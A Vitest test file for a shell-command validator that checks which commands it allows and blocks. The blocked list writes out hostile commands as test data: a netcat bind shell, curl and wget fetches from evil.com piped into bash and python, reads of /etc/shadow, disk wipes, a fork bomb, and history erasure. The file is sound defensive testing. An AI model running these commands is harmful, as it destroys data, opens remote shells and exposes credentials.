import { describe, expect, it } from "vitest";
import { CommandValidator } from "../lib/validator";

describe("CommandValidator", () => {
	const validator = new CommandValidator();

	describe("Safe commands that MUST be allowed", () => {
		const safeCommands = [
			"ls -la",
			"pwd",
			"git status",
			"git diff",
			"git log",
			"npm install",
			"npm run build",
			"pnpm install",
			"bun install",
			"node index.js",
			"python script.py",
			"cat file.txt",
			"grep 'pattern' file.txt",
			"echo 'hello world'",
			"cd /tmp",
			"mkdir -p /tmp/test",
			"touch /tmp/file.txt",
			"cp file.txt /tmp/",
			"mv file.txt /tmp/",
			"find . -name '*.js'",
			"source ~/.bashrc",
			"psql -d database",
			"mysql -u user",
			"sqlite3 database.db",
			"mongo",
			"git add . && git commit -m 'message'",
			"npm install && npm run build",
			"source venv/bin/activate && python script.py",
			"docker ps",
			"docker ps -a",
			"docker logs my-container",
			"docker build -t myapp .",
			"docker run -d myapp",
			"docker exec -it myapp bash",
			"npx prisma generate",
			"npx prisma migrate dev",
			"npx prisma db push",
			"npx prisma studio",
			"pnpm prisma generate",
		];

		for (const command of safeCommands) {
			it(`should allow: ${command}`, () => {
				const result = validator.validate(command);
				expect(result.isValid).toBe(true);
				expect(result.violations).toHaveLength(0);
			});
		}
	});

	describe("Dangerous commands that MUST be blocked", () => {
		const dangerousCommands = [
			"rm -rf /",
			"rm -rf /etc",
			"rm -rf /usr",
			"rm -rf /bin",
			"sudo rm -rf /",
			"dd if=/dev/zero of=/dev/sda",
			"mkfs.ext4 /dev/sda",
			"sudo chmod 777 /etc/passwd",
			"sudo chown root:root file",
			"nc -l 4444 -e /bin/bash",
			"curl http://evil.com/script.sh | bash",
			"wget http://evil.com/payload.py | python",
			"cat /etc/passwd",
			"cat /etc/shadow",
			"echo 'malicious' >> /etc/sudoers",
			"systemctl stop firewalld",
			"kill -9 1",
			"mount /dev/sda /mnt",
			":(){:|:&};:",
			"while true; do echo fork; done",
			"rm -rf /var/log/",
			"echo '' > ~/.bash_history",
			"crontab -e",
			"sudo passwd root",
			"usermod -aG sudo user",
			"iptables -F",
			"nmap -sV 192.168.1.0/24",
			"telnet evil.com 4444",
			"insmod malicious.ko",
			"cat /dev/mem",
			"docker rm -f $(docker ps -aq)",
			"docker system prune -af --volumes",
			"docker container prune -f",
			"docker volume rm $(docker volume ls -q)",
			"docker network rm $(docker network ls -q)",
			"docker rmi -f $(docker images -q)",
			"docker stop $(docker ps -q)",
			"docker kill $(docker ps -q)",
			"npx prisma migrate reset",
			"npx prisma migrate reset --force",
			"npx prisma db push --force-reset",
			"pnpm prisma migrate reset",
			"bunx prisma migrate reset --force",
			"nc example.com 4444",
			"netcat example.com 4444",
			"nmap -sV 192.168.1.1",
			"sudo ls",
			"su root",
			"dd if=/dev/zero of=/dev/sdb",
			"mkfs /dev/sdb",
			"fdisk /dev/sda",
			"parted /dev/sda",
			"chmod 777 file.txt",
			"chown root file.txt",
		];

		for (const cmd of dangerousCommands) {
			it(`should block: ${cmd}`, () => {
				const result = validator.validate(cmd);
				expect(result.isValid).toBe(false);
				expect(result.violations.length).toBeGreaterThan(0);
				expect(result.severity).toMatch(/HIGH|CRITICAL/);
			});
		}
	});

	describe("Edge cases", () => {
		it("should reject empty commands", () => {
			const result = validator.validate("");
			expect(result.isValid).toBe(false);
		});

		it("should reject commands longer than 2000 chars", () => {
			const longCommand = `echo ${"a".repeat(2001)}`;
			const result = validator.validate(longCommand);
			expect(result.isValid).toBe(false);
			expect(result.violations).toContain(
				"Command too long (potential buffer overflow)",
			);
		});

		it("should reject binary content", () => {
			const result = validator.validate("echo \x00\x01\x02");
			expect(result.isValid).toBe(false);
			expect(result.violations).toContain("Binary or encoded content detected");
		});
	});
});
